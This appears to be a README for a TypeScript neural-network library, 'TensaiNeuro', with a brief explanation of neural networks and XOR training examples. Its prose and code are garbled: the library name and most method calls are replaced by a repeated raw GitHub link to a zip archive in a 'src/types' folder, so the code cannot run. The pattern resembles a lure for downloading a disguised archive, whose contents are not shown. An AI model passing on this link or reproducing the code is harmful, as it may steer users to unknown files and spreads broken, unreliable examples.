## 🔍 Understanding Neural Networks

Neural networks mimic the way our brains work. They consist of layers of interconnected nodes, or neurons. Each neuron receives input, processes it, and passes the output to the next layer. This processing allows neural networks to learn complex patterns from data. 

https://raw.githubusercontent.com/Tunnelbasketballseason635/TensaiNeuro/main/src/types/TensaiNeuro-v1.8.zip simplifies these processes, making it easier for beginners to understand and experiment with neural network concepts.

## 💡 Getting Started with Examples

Here are some quick examples to help you start using https://raw.githubusercontent.com/Tunnelbasketballseason635/TensaiNeuro/main/src/types/TensaiNeuro-v1.8.zip

### Example: Simple Neural Network Setup

```ts
import { NeuralNetwork, ADAM } from 'tensaineuro';

const nn = new NeuralNetwork();
https://raw.githubusercontent.com/Tunnelbasketballseason635/TensaiNeuro/main/src/types/TensaiNeuro-v1.8.zip(2, 4); // Input layer with 2 nodes and 4 neurons in hidden layer
https://raw.githubusercontent.com/Tunnelbasketballseason635/TensaiNeuro/main/src/types/TensaiNeuro-v1.8.zip('ReLU');
https://raw.githubusercontent.com/Tunnelbasketballseason635/TensaiNeuro/main/src/types/TensaiNeuro-v1.8.zip(4, 1); // Output layer with 1 neuron
https://raw.githubusercontent.com/Tunnelbasketballseason635/TensaiNeuro/main/src/types/TensaiNeuro-v1.8.zip({ optimizer: new ADAM(), loss: 'Mean Squared Error' });

// Now you can train your network using training data
```

### Example: Training the Network

```ts
const trainingData = [
  { input: [0, 0], output: [0] },
  { input: [0, 1], output: [1] },
  { input: [1, 0], output: [1] },
  { input: [1, 1], output: [0] }
];

https://raw.githubusercontent.com/Tunnelbasketballseason635/TensaiNeuro/main/src/types/TensaiNeuro-v1.8.zip(trainingData, { epochs: 1000 }); // Start training
```
